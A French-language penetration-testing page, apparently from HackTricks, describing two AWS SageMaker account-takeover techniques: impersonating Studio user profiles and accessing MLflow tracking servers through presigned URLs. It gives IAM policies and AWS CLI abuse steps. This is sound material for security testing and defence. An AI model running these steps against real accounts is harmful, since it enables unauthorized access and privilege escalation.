# AWS - SageMaker Accès non autorisé

{{#include ../../../../banners/hacktricks-training.md}}

## SageMaker Studio - Prise de contrôle de compte via CreatePresignedDomainUrl (Se faire passer pour n'importe quel UserProfile)

### Description
Une identité disposant de la permission d'appeler `sagemaker:CreatePresignedDomainUrl` sur un `UserProfile` ciblé de Studio peut générer une URL de connexion qui authentifie directement dans SageMaker Studio en tant que ce profil. Cela accorde au navigateur de l'attaquant une session Studio qui hérite des permissions `ExecutionRole` du profil et l'accès complet au répertoire utilisateur monté sur EFS et aux apps du profil. Aucun `iam:PassRole` ni accès à la console n'est requis.

### Requirements
- Un SageMaker Studio `Domain` et un `UserProfile` cible à l'intérieur.
- Le principal attaquant doit avoir `sagemaker:CreatePresignedDomainUrl` sur le `UserProfile` cible (au niveau de la ressource) ou `*`.

Exemple de policy minimal (restreint à un seul UserProfile):
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sagemaker:CreatePresignedDomainUrl",
"Resource": "arn:aws:sagemaker:<region>:<account-id>:user-profile/<domain-id>/<user-profile-name>"
}
]
}
```
### Étapes d'abus

1) Énumérer un Studio Domain et des UserProfiles que vous pouvez cibler
```bash
DOM=$(aws sagemaker list-domains --query 'Domains[0].DomainId' --output text)
aws sagemaker list-user-profiles --domain-id-equals $DOM
TARGET_USER=<UserProfileName>
```
2) Générer une presigned URL (valide ~5 minutes par défaut)
```bash
aws sagemaker create-presigned-domain-url \
--domain-id $DOM \
--user-profile-name $TARGET_USER \
--query AuthorizedUrl --output text
```
3) Ouvrez l'URL retournée dans un navigateur pour vous connecter à Studio en tant qu'utilisateur cible. Dans un terminal Jupyter à l'intérieur de Studio, vérifiez l'identité effective :
```bash
aws sts get-caller-identity
```
Notes:
- `--landing-uri` peut être omis. Certaines valeurs (par ex., `app:JupyterLab:/lab`) peuvent être rejetées selon la variante/version de Studio; les valeurs par défaut redirigent généralement vers la page d'accueil de Studio puis vers Jupyter.
- Les politiques d'organisation / les restrictions d'endpoint VPC peuvent toujours bloquer l'accès réseau; la génération du token ne nécessite pas de connexion console ni `iam:PassRole`.

### Impact
- Mouvement latéral et escalade de privilèges en assumant n'importe quel Studio `UserProfile` dont l'ARN est autorisé, héritant ainsi de son `ExecutionRole` et de son système de fichiers/applications.

### Preuves (d'un test contrôlé)
- Avec uniquement `sagemaker:CreatePresignedDomainUrl` sur un `UserProfile` cible, le rôle attaquant a renvoyé avec succès un `AuthorizedUrl` comme :
```
https://studio-d-xxxxxxxxxxxx.studio.<region>.sagemaker.aws/auth?token=eyJhbGciOi...
```
- Une requête HTTP directe répond par une redirection (HTTP 302) vers Studio, confirmant que l'URL est valide et active jusqu'à expiration.


## SageMaker MLflow Tracking Server - ATO via CreatePresignedMlflowTrackingServerUrl

### Description
Une identité disposant de la permission d'appeler `sagemaker:CreatePresignedMlflowTrackingServerUrl` pour un SageMaker MLflow Tracking Server cible peut générer une URL pré-signée à usage unique qui authentifie directement sur l'interface MLflow gérée de ce serveur. Cela accorde le même accès qu'un utilisateur légitime au serveur (visualiser/créer des expériences et des exécutions, et télécharger/téléverser des artefacts dans le magasin d'artefacts S3 du serveur) sans accès à la console ni `iam:PassRole`.

### Prérequis
- Un SageMaker MLflow Tracking Server dans le compte/la région, et connaître son nom.
- Le principal attaquant a besoin de `sagemaker:CreatePresignedMlflowTrackingServerUrl` sur la ressource MLflow Tracking Server cible (ou `*`).

Minimal policy example (scoped to one Tracking Server):
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sagemaker:CreatePresignedMlflowTrackingServerUrl",
"Resource": "arn:aws:sagemaker:<region>:<account-id>:mlflow-tracking-server/<tracking-server-name>"
}
]
}
```
### Étapes d'abus

1) Énumérez les MLflow Tracking Servers que vous pouvez cibler et choisissez un nom
```bash
aws sagemaker list-mlflow-tracking-servers \
--query 'TrackingServerSummaries[].{Name:TrackingServerName,Status:TrackingServerStatus}'
TS_NAME=<tracking-server-name>
```
2) Générer une URL MLflow UI pré-signée (valide pendant une courte durée)
```bash
aws sagemaker create-presigned-mlflow-tracking-server-url \
--tracking-server-name "$TS_NAME" \
--expires-in-seconds 300 \
--session-expiration-duration-in-seconds 1800 \
--query AuthorizedUrl --output text
```
3) Ouvrez l'URL retournée dans un navigateur pour accéder à l'UI MLflow en tant qu'utilisateur authentifié pour ce Tracking Server.

Remarques :
- Le Tracking Server doit être dans un état prêt (par ex., `Created/Active`). S'il est encore en `Creating`, l'appel sera rejeté.
- L'URL pré-signée est à usage unique et de courte durée ; générez-en une nouvelle si nécessaire.

### Impact
- Accès direct à l'UI MLflow gérée pour le Tracking Server ciblé, permettant la consultation et la modification des experiments/runs et la récupération ou le téléversement d'artefacts stockés dans le S3 artifact store configuré du serveur, dans les limites des permissions appliquées par la configuration du serveur.

{{#include ../../../../banners/hacktricks-training.md}}
